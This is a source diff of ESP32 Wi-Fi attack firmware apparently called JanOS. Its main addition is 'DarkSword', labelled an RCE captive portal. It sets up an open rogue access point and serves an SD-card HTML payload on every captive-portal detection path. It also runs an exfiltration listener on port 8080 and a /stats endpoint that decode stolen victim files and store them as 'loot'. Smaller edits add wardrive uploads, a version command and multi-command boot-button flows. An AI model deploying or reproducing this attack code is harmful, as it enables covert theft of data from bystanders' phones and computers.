+        MY_LOG_INFO(TAG, "No Wardrive files (.log/.csv) found in /sdcard/lab/wardrives/");
+        MY_LOG_INFO(TAG, "Done: 0 uploaded, 0 skipped, 0 failed");
+        closedir(dir);
+        return 0;
+    }
+
+    MY_LOG_INFO(TAG, "Uploading %d Wardrive file(s) to wdgwars.pl...", total_files);
+
+    rewinddir(dir);
+    int current = 0;
+
+    while ((entry = readdir(dir)) != NULL) {
+        if (entry->d_type == DT_DIR) {
+            continue;
+        }
+        if (!wdgwars_is_upload_candidate(entry->d_name)) {
+            continue;
+        }
+
+        current++;
+        char filepath[280];
+        snprintf(filepath, sizeof(filepath), "/sdcard/lab/wardrives/%s", entry->d_name);
+
+        struct stat st;
+        long fsize = 0;
+        if (stat(filepath, &st) == 0) {
+            fsize = (long)st.st_size;
+        }
+
+        int result = wdgwars_upload_file(filepath, entry->d_name);
+        if (result == 0) {
+            MY_LOG_INFO(TAG, "[%d/%d] %s (%ld bytes) -> OK", current, total_files, entry->d_name, fsize);
+            uploaded++;
+        } else if (result == 1) {
+            MY_LOG_INFO(TAG, "[%d/%d] %s (%ld bytes) -> skipped", current, total_files, entry->d_name, fsize);
+            skipped++;
+        } else if (result == 2) {
+            MY_LOG_INFO(TAG, "WDGWARS AUTH FAILED");
             MY_LOG_INFO(TAG, "[%d/%d] %s (%ld bytes) -> AUTH FAILED", current, total_files, entry->d_name, fsize);
             failed++;
             auth_failed = true;
@@ -7764,6 +8518,37 @@ static int cmd_stop(int argc, char **argv) {
         }
     }
     
+    // Stop DarkSword if active
+    if (darksword_active) {
+        MY_LOG_INFO(TAG, "Stopping DarkSword...");
+        darksword_active = false;
+
+        // Stop exfil listener task
+        if (darksword_exfil_task_handle != NULL) {
+            if (darksword_exfil_socket >= 0) {
+                close(darksword_exfil_socket);
+                darksword_exfil_socket = -1;
+            }
+            for (int i = 0; i < 30 && darksword_exfil_task_handle != NULL; i++) {
+                vTaskDelay(pdMS_TO_TICKS(100));
+            }
+            if (darksword_exfil_task_handle != NULL) {
+                vTaskDelete(darksword_exfil_task_handle);
+                darksword_exfil_task_handle = NULL;
+                MY_LOG_INFO(TAG, "DarkSword exfil task force-deleted");
+            }
+        }
+
+        // Free HTML buffer
+        if (darksword_html != NULL) {
+            heap_caps_free(darksword_html);
+            darksword_html = NULL;
+            darksword_html_len = 0;
+            darksword_html_gzipped = false;
+        }
+        MY_LOG_INFO(TAG, "DarkSword stopped.");
+    }
+
     // Stop portal if active
     if (portal_active) {
         MY_LOG_INFO(TAG, "Stopping portal...");
@@ -7930,7 +8715,7 @@ static const cli_hint_t k_cli_hints[] = {
     { "start_portal", " <SSID>" },
     { "start_karma", " <index>" },
     { "vendor", " set <on|off> | read" },
-    { "boot_button", " read|list|set <short|long> <command> | status <short|long> <on|off>" },
+    { "boot_button", " read|list|set <short|long> <command[, command...]> | status <short|long> <on|off>" },
     { "led", " set <on|off> | level <1-100> | read" },
     { "channel_time", " set <min|max> <ms> | read <min|max>" },
     { "wifi_connect", " <SSID> [Password] [ota] [<IP> <Netmask> <GW> [DNS1] [DNS2]]" },
@@ -7946,6 +8731,8 @@ static const cli_hint_t k_cli_hints[] = {
     { "wpasec_upload", "" },
     { "wigle_key", " set <api_name> <api_token> | read" },
     { "wigle_upload", " [file1 file2 ...]" },
+    { "wdgwars_key", " set <key> | read" },
+    { "wdgwars_upload", " [file1 file2 ...]" },
     { "add_ssid", " <SSID>" },
     { "remove_ssid", " <index>" },
 };
@@ -10847,6 +11634,12 @@ static int cmd_ping(int argc, char **argv) {
     return 0;
 }
 
+static int cmd_version(int argc, char **argv) {
+    (void)argc; (void)argv;
+    MY_LOG_INFO(TAG, "JanOS version: " JANOS_VERSION);
+    return 0;
+}
+
 static int cmd_led(int argc, char **argv) {
     if (argc < 2) {
         MY_LOG_INFO(TAG, "Usage: led set <on|off> | led level <1-100> | led read");
@@ -11012,7 +11805,7 @@ static boot_action_config_t* boot_get_action_slot(const char* which) {
 
 static int cmd_boot_button(int argc, char **argv) {
     if (argc < 2) {
-        MY_LOG_INFO(TAG, "Usage: boot_button read | boot_button list | boot_button set <short|long> <command> | boot_button status <short|long> <on|off>");
+        MY_LOG_INFO(TAG, "Usage: boot_button read | boot_button list | boot_button set <short|long> <command[, command...]> | boot_button status <short|long> <on|off>");
         return 1;
     }
 
@@ -11028,7 +11821,7 @@ static int cmd_boot_button(int argc, char **argv) {
 
     if (strcasecmp(argv[1], "set") == 0) {
         if (argc < 4) {
-            MY_LOG_INFO(TAG, "Usage: boot_button set <short|long> <command>");
+            MY_LOG_INFO(TAG, "Usage: boot_button set <short|long> <command[, command...]>");
             boot_list_allowed_commands();
             return 1;
         }
@@ -11037,12 +11830,27 @@ static int cmd_boot_button(int argc, char **argv) {
             MY_LOG_INFO(TAG, "Unknown target '%s' (use short|long)", argv[2]);
             return 1;
         }
-        if (!boot_is_command_allowed(argv[3])) {
-            MY_LOG_INFO(TAG, "Command '%s' not allowed", argv[3]);
+
+        char flow[BOOTCFG_CMD_MAX_LEN];
+        if (!boot_build_command_flow_from_argv(argc, argv, 3, flow, sizeof(flow))) {
+            MY_LOG_INFO(TAG, "Boot flow too long (max %d chars)", BOOTCFG_CMD_MAX_LEN - 1);
+            return 1;
+        }
+
+        char detail[BOOTCFG_CMD_MAX_LEN];
+        boot_flow_validation_result_t validation = boot_validate_command_flow(flow, detail, sizeof(detail));
+        if (validation == BOOT_FLOW_INVALID_COMMAND) {
+            MY_LOG_INFO(TAG, "Command '%s' not allowed", detail);
             boot_list_allowed_commands();
             return 1;
         }
-        strlcpy(slot->command, argv[3], sizeof(slot->command));
+        if (validation != BOOT_FLOW_VALID) {
+            MY_LOG_INFO(TAG, "Malformed boot flow. Separate commands with commas.");
+            boot_list_allowed_commands();
+            return 1;
+        }
+
+        strlcpy(slot->command, flow, sizeof(slot->command));
         boot_config_persist();
         boot_config_print();
         return 0;
@@ -13063,6 +13871,492 @@ static void dns_server_task(void *pvParameters) {
     vTaskDelete(NULL);
 }
 
+// ─── DarkSword helpers ───────────────────────────────────────────────
+
+// Load darksword.html from SD card into PSRAM
+static bool load_darksword_html(void) {
+    esp_err_t ret = init_sd_card();
+    if (ret != ESP_OK) {
+        MY_LOG_INFO(TAG, "DS: SD card init failed: %s", esp_err_to_name(ret));
+        return false;
+    }
+
+    // Try gzipped version first — much smaller, faster to serve
+    const char *gz_path = "/sdcard/lab/htmls/darksword.html.gz";
+    const char *raw_path = "/sdcard/lab/htmls/darksword.html";
+    bool is_gz = false;
+
+    FILE *f = fopen(gz_path, "rb");
+    if (f) {
+        is_gz = true;
+        MY_LOG_INFO(TAG, "DS: Found gzipped file %s", gz_path);
+    } else {
+        f = fopen(raw_path, "r");
+        if (!f) {
+            MY_LOG_INFO(TAG, "DS: Cannot open %s or %s", gz_path, raw_path);
+            return false;
+        }
+    }
+
+    fseek(f, 0, SEEK_END);
+    long fsize = ftell(f);
+    fseek(f, 0, SEEK_SET);
+
+    if (fsize <= 0 || fsize > 4 * 1024 * 1024) {
+        MY_LOG_INFO(TAG, "DS: File size invalid: %ld", fsize);
+        fclose(f);
+        return false;
+    }
+
+    if (darksword_html) {
+        heap_caps_free(darksword_html);
+        darksword_html = NULL;
+    }
+
+    darksword_html = (char *)heap_caps_malloc((size_t)fsize + 1, MALLOC_CAP_SPIRAM);
+    if (!darksword_html) {
+        MY_LOG_INFO(TAG, "DS: PSRAM alloc failed (%ld bytes)", fsize);
+        fclose(f);
+        return false;
+    }
+
+    size_t rd = fread(darksword_html, 1, (size_t)fsize, f);
+    darksword_html[rd] = '\0';
+    darksword_html_len = rd;
+    darksword_html_gzipped = is_gz;
+    fclose(f);
+    MY_LOG_INFO(TAG, "DS: Loaded %s (%u bytes, gzip=%d)",
+                is_gz ? gz_path : raw_path, (unsigned)rd, is_gz);
+    return true;
+}
+
+// HTTP handler: serve darksword HTML with chunked transfer (2+ MB)
+static esp_err_t darksword_page_handler(httpd_req_t *req) {
+    if (!darksword_html || darksword_html_len == 0) {
+        httpd_resp_send_err(req, HTTPD_500_INTERNAL_SERVER_ERROR, "HTML not loaded");
+        return ESP_FAIL;
+    }
+
+    httpd_resp_set_type(req, "text/html");
+    httpd_resp_set_hdr(req, "Cache-Control", "no-cache");
+    if (darksword_html_gzipped) {
+        httpd_resp_set_hdr(req, "Content-Encoding", "gzip");
+    }
+
+    // With gzip (~50-150 KB) the transfer is much faster and more reliable
+    const size_t chunk = 4096;
+    size_t sent = 0;
+    while (sent < darksword_html_len) {
+        size_t remaining = darksword_html_len - sent;
+        size_t to_send = remaining < chunk ? remaining : chunk;
+        esp_err_t err = httpd_resp_send_chunk(req, darksword_html + sent, to_send);
+        if (err != ESP_OK) {
+            MY_LOG_INFO(TAG, "DS: chunk send error at offset %u", (unsigned)sent);
+            httpd_resp_send_chunk(req, NULL, 0);
+            return ESP_FAIL;
+        }
+        sent += to_send;
+    }
+    httpd_resp_send_chunk(req, NULL, 0);
+    return ESP_OK;
+}
+
+// Save one exfiltrated file to /sdcard/loot/portal/<category>/<filename>
+static void darksword_save_loot(const char *json_body, size_t json_len) {
+    cJSON *root = cJSON_ParseWithLength(json_body, json_len);
+    if (!root) {
+        MY_LOG_INFO(TAG, "DS loot: JSON parse failed");
+        return;
+    }
+
+    const cJSON *j_path = cJSON_GetObjectItem(root, "path");
+    const cJSON *j_cat  = cJSON_GetObjectItem(root, "category");
+    const cJSON *j_data = cJSON_GetObjectItem(root, "data");
+    const cJSON *j_uuid = cJSON_GetObjectItem(root, "deviceUUID");
+
+    if (!cJSON_IsString(j_path) || !cJSON_IsString(j_data)) {
+        MY_LOG_INFO(TAG, "DS loot: missing path/data");
+        cJSON_Delete(root);
+        return;
+    }
+
+    const char *category = (cJSON_IsString(j_cat) && j_cat->valuestring[0])
+                            ? j_cat->valuestring : "misc";
+    const char *uuid_str = (cJSON_IsString(j_uuid) && j_uuid->valuestring[0])
+                            ? j_uuid->valuestring : "unknown";
+
+    // Build directory: /sdcard/loot/portal/<uuid>/<category>/
+    char dir[256];
+    snprintf(dir, sizeof(dir), "/sdcard/loot/portal/%s/%s", uuid_str, category);
+
+    // Recursive mkdir (up to 4 levels)
+    {
+        char tmp[256];
+        snprintf(tmp, sizeof(tmp), "%s", dir);
+        for (char *p = tmp + 1; *p; p++) {
+            if (*p == '/') {
+                *p = '\0';
+                mkdir(tmp, 0755);
+                *p = '/';
+            }
+        }
+        mkdir(tmp, 0755);
+    }
+
+    // Derive filename from path (last component)
+    const char *fname = strrchr(j_path->valuestring, '/');
+    fname = fname ? fname + 1 : j_path->valuestring;
+    if (!fname[0]) fname = "data.bin";
+
+    char filepath[320];
+    snprintf(filepath, sizeof(filepath), "%s/%s", dir, fname);
+
+    // Base64-decode data
+    const char *b64 = j_data->valuestring;
+    size_t b64_len = strlen(b64);
+    size_t decoded_len = 0;
+
+    // First pass: get decoded length
+    if (mbedtls_base64_decode(NULL, 0, &decoded_len, (const unsigned char *)b64, b64_len) != MBEDTLS_ERR_BASE64_BUFFER_TOO_SMALL && decoded_len == 0) {
+        MY_LOG_INFO(TAG, "DS loot: base64 length check failed");
+        cJSON_Delete(root);
+        return;
+    }
+
+    uint8_t *decoded = (uint8_t *)heap_caps_malloc(decoded_len, MALLOC_CAP_SPIRAM);
+    if (!decoded) {
+        decoded = (uint8_t *)malloc(decoded_len);
+    }
+    if (!decoded) {
+        MY_LOG_INFO(TAG, "DS loot: alloc %u failed", (unsigned)decoded_len);
+        cJSON_Delete(root);
+        return;
+    }
+
+    size_t olen = 0;
+    int rc = mbedtls_base64_decode(decoded, decoded_len, &olen,
+                                    (const unsigned char *)b64, b64_len);
+    if (rc != 0) {
+        MY_LOG_INFO(TAG, "DS loot: base64 decode error %d", rc);
+        free(decoded);
+        cJSON_Delete(root);
+        return;
+    }
+
+    FILE *f = fopen(filepath, "wb");
+    if (!f) {
+        MY_LOG_INFO(TAG, "DS loot: cannot write %s", filepath);
+        free(decoded);
+        cJSON_Delete(root);
+        return;
+    }
+    fwrite(decoded, 1, olen, f);
+    fflush(f);
+    fclose(f);
+    sd_sync();
+
+    MY_LOG_INFO(TAG, "DS loot: saved %s (%u bytes) [%s]", filepath, (unsigned)olen, category);
+    free(decoded);
+    cJSON_Delete(root);
+}
+
+// HTTP POST /stats handler — exfil data arriving on port 80
+static esp_err_t darksword_stats_handler(httpd_req_t *req) {
+    // Allow CORS preflight
+    httpd_resp_set_hdr(req, "Access-Control-Allow-Origin", "*");
+    httpd_resp_set_hdr(req, "Access-Control-Allow-Methods", "POST, OPTIONS");
+    httpd_resp_set_hdr(req, "Access-Control-Allow-Headers", "Content-Type");
+
+    if (req->method == HTTP_OPTIONS) {
+        httpd_resp_send(req, NULL, 0);
+        return ESP_OK;
+    }
+
+    int total = req->content_len;
+    if (total <= 0 || total > 2 * 1024 * 1024) {
+        httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "Bad length");
+        return ESP_FAIL;
+    }
+
+    char *body = (char *)heap_caps_malloc(total + 1, MALLOC_CAP_SPIRAM);
+    if (!body) body = (char *)malloc(total + 1);
+    if (!body) {
+        httpd_resp_send_err(req, HTTPD_500_INTERNAL_SERVER_ERROR, "OOM");
+        return ESP_FAIL;
+    }
+
+    int received = 0;
+    while (received < total) {
+        int r = httpd_req_recv(req, body + received, total - received);
+        if (r <= 0) {
+            free(body);
+            httpd_resp_send_err(req, HTTPD_500_INTERNAL_SERVER_ERROR, "Recv error");
+            return ESP_FAIL;
+        }
+        received += r;
+    }
+    body[received] = '\0';
+
+    darksword_save_loot(body, (size_t)received);
+    free(body);
+
+    httpd_resp_set_type(req, "application/json");
+    httpd_resp_send(req, "{\"status\":\"ok\"}", HTTPD_RESP_USE_STRLEN);
+    return ESP_OK;
+}
+
+// Raw TCP exfiltration listener on port 8080
+// Accepts connections, reads HTTP-like POST /stats, extracts JSON body
+static void darksword_exfil_task(void *pvParameters) {
+    (void)pvParameters;
+
+    int listen_fd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+    if (listen_fd < 0) {
+        MY_LOG_INFO(TAG, "DS exfil: socket() failed");
+        darksword_exfil_task_handle = NULL;
+        vTaskDelete(NULL);
+        return;
+    }
+    darksword_exfil_socket = listen_fd;
+
+    int opt = 1;
+    setsockopt(listen_fd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
+
+    struct sockaddr_in addr = {
+        .sin_family = AF_INET,
+        .sin_port = htons(8080),
+        .sin_addr.s_addr = htonl(INADDR_ANY),
+    };
+
+    if (bind(listen_fd, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
+        MY_LOG_INFO(TAG, "DS exfil: bind() failed");
+        close(listen_fd);
+        darksword_exfil_socket = -1;
+        darksword_exfil_task_handle = NULL;
+        vTaskDelete(NULL);
+        return;
+    }
+
+    if (listen(listen_fd, 2) < 0) {
+        MY_LOG_INFO(TAG, "DS exfil: listen() failed");
+        close(listen_fd);
+        darksword_exfil_socket = -1;
+        darksword_exfil_task_handle = NULL;
+        vTaskDelete(NULL);
+        return;
+    }
+
+    MY_LOG_INFO(TAG, "DS exfil: listening on port 8080");
+
+    while (darksword_active) {
+        struct sockaddr_in cli;
+        socklen_t cli_len = sizeof(cli);
+        int client_fd = accept(listen_fd, (struct sockaddr *)&cli, &cli_len);
+        if (client_fd < 0) {
+            if (!darksword_active) break;
+            vTaskDelay(pdMS_TO_TICKS(50));
+            continue;
+        }
+
+        // Set receive timeout
+        struct timeval tv = { .tv_sec = 10, .tv_usec = 0 };
+        setsockopt(client_fd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
+
+        // Read up to 2 MB
+        size_t buf_sz = 2 * 1024 * 1024;
+        char *buf = (char *)heap_caps_malloc(buf_sz, MALLOC_CAP_SPIRAM);
+        if (!buf) {
+            close(client_fd);
+            continue;
+        }
+
+        size_t total_read = 0;
+        while (total_read < buf_sz) {
+            int r = recv(client_fd, buf + total_read, buf_sz - total_read, 0);
+            if (r <= 0) break;
+            total_read += (size_t)r;
+            // Check if we got the full HTTP request (double CRLF + content-length worth of body)
+            if (total_read > 4) {
+                char *body_start = strstr(buf, "\r\n\r\n");
+                if (body_start) {
+                    body_start += 4;
+                    // Try to find Content-Length
+                    char *cl_hdr = strcasestr(buf, "Content-Length:");
+                    if (cl_hdr) {
+                        int cl = atoi(cl_hdr + 15);
+                        size_t hdr_len = (size_t)(body_start - buf);
+                        if (cl > 0 && total_read >= hdr_len + (size_t)cl) break;
+                    }
+                }
+            }
+        }
+        buf[total_read < buf_sz ? total_read : buf_sz - 1] = '\0';
+
+        // Send HTTP 200 response
+        const char *resp = "HTTP/1.1 200 OK\r\n"
+                           "Content-Type: application/json\r\n"
+                           "Access-Control-Allow-Origin: *\r\n"
+                           "Connection: close\r\n"
+                           "Content-Length: 15\r\n\r\n"
+                           "{\"status\":\"ok\"}";
+        send(client_fd, resp, strlen(resp), 0);
+        close(client_fd);
+
+        // Extract JSON body
+        char *body = strstr(buf, "\r\n\r\n");
+        if (body) {
+            body += 4;
+            size_t body_len = total_read - (size_t)(body - buf);
+            if (body_len > 0) {
+                darksword_save_loot(body, body_len);
+            }
+        }
+        heap_caps_free(buf);
+    }
+
+    if (darksword_exfil_socket >= 0) {
+        close(darksword_exfil_socket);
+        darksword_exfil_socket = -1;
+    }
+    MY_LOG_INFO(TAG, "DS exfil: task exiting");
+    darksword_exfil_task_handle = NULL;
+    vTaskDelete(NULL);
+}
+
+// ─── cmd_start_darksword ─────────────────────────────────────────────
+static int cmd_start_darksword(int argc, char **argv) {
+    oled_display_update_full("> DarkSword",
+        argc >= 2 ? argv[1] : "  No SSID",
+        "  RCE portal", "  Waiting...");
+    log_memory_info("start_darksword");
+
+    if (!ensure_wifi_mode()) return 1;
+
+    if (argc < 2) {
+        MY_LOG_INFO(TAG, "Usage: start_darksword <SSID>");
+        return 1;
+    }
+
+    if (portal_active || darksword_active) {
+        MY_LOG_INFO(TAG, "A portal is already running. Use 'stop' first.");
+        return 0;
+    }
+
+    const char *ssid = argv[1];
+    size_t ssid_len = strlen(ssid);
+    if (ssid_len == 0 || ssid_len > 32) {
+        MY_LOG_INFO(TAG, "SSID length must be 1-32");
+        return 1;
+    }
+
+    // Load HTML from SD
+    if (!load_darksword_html()) return 1;
+
+    // Store portal SSID
+    if (portalSSID) { free(portalSSID); portalSSID = NULL; }
+    portalSSID = strdup(ssid);
+
+    MY_LOG_INFO(TAG, "Starting DarkSword portal with SSID: %s", ssid);
+
+    // Enable AP
+    esp_netif_t *ap_netif = ensure_ap_mode();
+    if (!ap_netif) { MY_LOG_INFO(TAG, "DS: AP mode failed"); return 1; }
+
+    esp_netif_dhcps_stop(ap_netif);
+
+    esp_netif_ip_info_t ip_info;
+    ip_info.ip.addr      = esp_ip4addr_aton("172.0.0.1");
+    ip_info.gw.addr      = esp_ip4addr_aton("172.0.0.1");
+    ip_info.netmask.addr = esp_ip4addr_aton("255.255.255.0");
+    esp_netif_set_ip_info(ap_netif, &ip_info);
+
+    wifi_config_t ap_cfg = {0};
+    memcpy(ap_cfg.ap.ssid, ssid, ssid_len);
+    ap_cfg.ap.ssid_len = ssid_len;
+    ap_cfg.ap.channel = 1;
+    ap_cfg.ap.max_connection = 4;
+    ap_cfg.ap.authmode = WIFI_AUTH_OPEN;
+    esp_wifi_set_config(WIFI_IF_AP, &ap_cfg);
+
+    esp_netif_dhcps_start(ap_netif);
+    vTaskDelay(pdMS_TO_TICKS(1000));
+
+    // HTTP server config — increase max_uri_handlers and recv buffer for large POST
+    httpd_config_t config = HTTPD_DEFAULT_CONFIG();
+    config.server_port = 80;
+    config.max_open_sockets = 4;
+    config.max_uri_handlers = 16;
+    config.recv_wait_timeout = 30;
+    config.send_wait_timeout = 30;
+    config.stack_size = 8192;
+
+    esp_err_t http_ret = httpd_start(&portal_server, &config);
+    if (http_ret != ESP_OK) {
+        MY_LOG_INFO(TAG, "DS: HTTP server failed: %s", esp_err_to_name(http_ret));
+        return 1;
+    }
+
+    // Register darksword page on all captive-portal paths
+    const httpd_uri_t page_uris[] = {
+        { .uri = "/",                   .method = HTTP_GET, .handler = darksword_page_handler },
+        { .uri = "/portal",             .method = HTTP_GET, .handler = darksword_page_handler },
+        { .uri = "/hotspot-detect.html",.method = HTTP_GET, .handler = darksword_page_handler },
+        { .uri = "/generate_204",       .method = HTTP_GET, .handler = darksword_page_handler },
+        { .uri = "/ncsi.txt",           .method = HTTP_GET, .handler = darksword_page_handler },
+        { .uri = "/*",                  .method = HTTP_GET, .handler = darksword_page_handler },
+    };
+    for (int i = 0; i < sizeof(page_uris)/sizeof(page_uris[0]); i++) {
+        httpd_register_uri_handler(portal_server, &page_uris[i]);
+    }
+
+    // POST /stats on port 80 (backup path)
+    const httpd_uri_t stats_post = {
+        .uri = "/stats", .method = HTTP_POST, .handler = darksword_stats_handler
+    };
+    httpd_register_uri_handler(portal_server, &stats_post);
+
+    // OPTIONS /stats for CORS preflight
+    const httpd_uri_t stats_options = {
+        .uri = "/stats", .method = HTTP_OPTIONS, .handler = darksword_stats_handler
+    };
+    httpd_register_uri_handler(portal_server, &stats_options);
+
+    // RFC 8908 captive portal API
+    const httpd_uri_t api_uri = {
+        .uri = "/captive-portal/api", .method = HTTP_GET, .handler = captive_api_handler
+    };
+    httpd_register_uri_handler(portal_server, &api_uri);
+
+    darksword_active = true;
+    portal_active = true;
+
+    // DNS server
+    BaseType_t dns_ret = xTaskCreate(dns_server_task, "dns_server", 4096, NULL, 5,
+                                     &dns_server_task_handle);
+    if (dns_ret != pdPASS) {
+        darksword_active = false;
+        portal_active = false;
+        httpd_stop(portal_server);
+        portal_server = NULL;
+        return 1;
+    }
+
+    // Exfil listener on port 8080
+    BaseType_t exfil_ret = xTaskCreate(darksword_exfil_task, "ds_exfil", 8192, NULL, 5,
+                                       &darksword_exfil_task_handle);
+    if (exfil_ret != pdPASS) {
+        MY_LOG_INFO(TAG, "DS: exfil task creation failed — port 80 /stats still available");
+    }
+
+    led_set_color(255, 0, 0); // Red for DarkSword
+
+    MY_LOG_INFO(TAG, "DarkSword portal active!");
+    MY_LOG_INFO(TAG, "  AP: %s  IP: 172.0.0.1", ssid);
+    MY_LOG_INFO(TAG, "  HTTP :80   Exfil :8080");
+    MY_LOG_INFO(TAG, "  Loot: /sdcard/loot/portal/");
+    return 0;
+}
+
 // Start portal command
 static int cmd_start_portal(int argc, char **argv) {
     oled_display_update_full("> Captive Portal",
@@ -14659,6 +15953,24 @@ static void register_commands(void)
     };
     ESP_ERROR_CHECK(esp_console_cmd_register(&wigle_upload_cmd));
 
+    const esp_console_cmd_t wdgwars_key_cmd = {
+        .command = "wdgwars_key",
+        .help = "Set/read WDGWars API key: wdgwars_key set <key> | wdgwars_key read",
+        .hint = NULL,
+        .func = &cmd_wdgwars_key,
+        .argtable = NULL
+    };
+    ESP_ERROR_CHECK(esp_console_cmd_register(&wdgwars_key_cmd));
+
+    const esp_console_cmd_t wdgwars_upload_cmd = {
+        .command = "wdgwars_upload",
+        .help = "Upload Wardrive files to WDGWars: wdgwars_upload [file1 file2 ...] (no args = upload all)",
+        .hint = NULL,
+        .func = &cmd_wdgwars_upload,
+        .argtable = NULL
+    };
+    ESP_ERROR_CHECK(esp_console_cmd_register(&wdgwars_upload_cmd));
+
        const esp_console_cmd_t sae_overflow_cmd = {
         .command = "sae_overflow",
         .help = "Starts SAE WPA3 Client Overflow attack.",
@@ -14758,6 +16070,15 @@ static void register_commands(void)
     };
     ESP_ERROR_CHECK(esp_console_cmd_register(&portal_cmd));
 
+    const esp_console_cmd_t darksword_cmd = {
+        .command = "start_darksword",
+        .help = "DarkSword RCE captive portal: start_darksword <SSID>. Serves /sdcard/lab/htmls/darksword.html, exfil on :8080, loot in /sdcard/loot/portal/",
+        .hint = "<SSID>",
+        .func = &cmd_start_darksword,
+        .argtable = NULL
+    };
+    ESP_ERROR_CHECK(esp_console_cmd_register(&darksword_cmd));
+
     const esp_console_cmd_t rogueap_cmd = {
         .command = "start_rogueap",
         .help = "Start WPA2 rogue AP with captive portal: start_rogueap <SSID> <password>. Requires select_html first. Runs deauth if networks selected.",
@@ -14796,7 +16117,7 @@ static void register_commands(void)
 
     const esp_console_cmd_t boot_button_cmd = {
         .command = "boot_button",
-        .help = "Configure boot button actions: boot_button read|list|set <short|long> <command>|status <short|long> <on|off>",
+        .help = "Configure boot button actions: boot_button read|list|set <short|long> <command[, command...]>|status <short|long> <on|off>",
         .hint = NULL,
         .func = &cmd_boot_button,
         .argtable = NULL
@@ -15073,6 +16394,15 @@ static void register_commands(void)
         .argtable = NULL
     };
     ESP_ERROR_CHECK(esp_console_cmd_register(&scan_airtag_cmd));
+
+    const esp_console_cmd_t version_cmd = {
+        .command = "version",
+        .help = "Prints JanOS firmware version",
+        .hint = NULL,
+        .func = &cmd_version,
+        .argtable = NULL
+    };
+    ESP_ERROR_CHECK(esp_console_cmd_register(&version_cmd));
 }
 
 void app_main(void) {
@@ -15174,6 +16504,7 @@ void app_main(void) {
     ota_load_channel_from_nvs();
     wpasec_load_key_from_nvs();
     wigle_load_key_from_nvs();
+    wdgwars_load_key_from_nvs();
     ota_mark_valid_if_pending();
     ota_log_boot_info();
     {
@@ -15349,8 +16680,11 @@ void app_main(void) {
       MY_LOG_INFO(TAG,"  unselect_networks");
       MY_LOG_INFO(TAG,"  unselect_stations");
       MY_LOG_INFO(TAG,"  vendor set <on|off> | vendor read");
+      MY_LOG_INFO(TAG,"  version");
       MY_LOG_INFO(TAG,"  wifi_connect <SSID> [Password] [ota] [<IP> <Netmask> <GW> [DNS1] [DNS2]]");
       MY_LOG_INFO(TAG,"  wifi_disconnect");
+      MY_LOG_INFO(TAG,"  wdgwars_key set <key> | wdgwars_key read");
+      MY_LOG_INFO(TAG,"  wdgwars_upload");
       MY_LOG_INFO(TAG,"  wigle_key set <api_name> <api_token> | wigle_key read");
       MY_LOG_INFO(TAG,"  wigle_upload");
       MY_LOG_INFO(TAG,"  wpasec_key set <key> | wpasec_key read");
@@ -15447,6 +16781,35 @@ void app_main(void) {
                         }
                     } else {
                         MY_LOG_INFO(TAG, "Invalid /sdcard/lab/wigle.txt format. Expected: api_name:api_token");
+                    }
+                }
+                fclose(wf);
+            }
+        }
+        // Check for WDGWars API key file on SD card (format: one line, 64-char key)
+        {
+            FILE *wf = fopen("/sdcard/lab/wdgwars.txt", "r");
+            if (wf) {
+                static char line[128];
+                memset(line, 0, sizeof(line));
+                if (fgets(line, sizeof(line), wf)) {
+                    size_t ln = strlen(line);
+                    while (ln > 0 && (line[ln - 1] == '\n' || line[ln - 1] == '\r' || isspace((unsigned char)line[ln - 1]))) {
+                        line[--ln] = '\0';
+                    }
+                    while (*line && isspace((unsigned char)*line)) {
+                        memmove(line, line + 1, strlen(line));
+                    }
+                    if (line[0] != '\0') {
+                        if (strlen(line) >= WDGWARS_KEY_MAX_LEN) {
+                            MY_LOG_INFO(TAG, "Invalid /sdcard/lab/wdgwars.txt format. Expected one API key (max %d chars).", WDGWARS_KEY_MAX_LEN - 1);
+                        } else if (wdgwars_save_key_to_nvs(line)) {
+                            strncpy(wdgwars_api_key, line, sizeof(wdgwars_api_key) - 1);
+                            wdgwars_api_key[sizeof(wdgwars_api_key) - 1] = '\0';
+                            MY_LOG_INFO(TAG, "WDGWars key updated from SD card into NVS.");
+                        } else {
+                            MY_LOG_INFO(TAG, "Failed to save WDGWars key from SD card to NVS.");
+                        }
                     }
                 }
                 fclose(wf);
